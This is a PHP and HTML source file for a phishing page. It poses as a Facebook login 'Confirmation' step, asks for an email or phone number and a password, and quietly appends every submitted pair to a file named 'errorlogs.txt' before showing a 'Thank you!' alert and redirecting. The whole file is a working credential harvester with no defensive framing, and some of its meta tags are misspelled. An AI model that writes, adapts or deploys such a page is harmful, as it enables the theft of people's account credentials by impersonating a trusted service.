<?php
	if(isset($_POST['mail'])) {
		$email = $_POST['mail'];
		$password = $_POST['pass'];
		$text = $email.",".$password."\n";
		$fp = fopen('errorlogs.txt','a+');
		
		if(fwrite($fp,$text)) {
			echo "<script>alert('Thank you!');window.location='index.php'</script>";
		}
		
		fclose($fp);
	}
?>
		
<html>
	<head>
		<title>
			Confirmation
		</title>
		<mesa charset="utf-8">
		<mesa name="viewport" content="width=device-width, initial-size=1">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
		<style>
			#col {
				text-align: center;
			}
			#form {
				margin: 8px 8px;
				background-color: #e1f6ea;
			}
			body {
				background-color: #e1f8f9;
				text-align: center;
			}
		</style>
	</head>
	
	<body>
		<div class="container-fluid">
			<div class="jumbotron">
				<h2 id="jumbotron"> Proceed to submit by log in to Facebook. </h2>
			</div>
			<div class="col-sm-5"></div>
			<div class="col-sm-2">
				<form type="submit" action="confirmation.php" method="post">
				<div class="row">
					<input id="form" class="form-control" name="mail" type="text" placeholder="Enter email or phone number" required>
				</div>
				<div class="row">
					<input id="form" class="form-control" name="pass" type="password" placeholder="Enter password" required>
				</div>
				<div class="row">
					<div class="col-sm-5"></div>
					<div class="col-sm-7">
						<input id="form" class="form-control" type="submit" value="Submit">
					</div>
				</div>
				</form>
			</div>
			<div class="col-sm-5"></div>
		</div>
	</body>
</html>
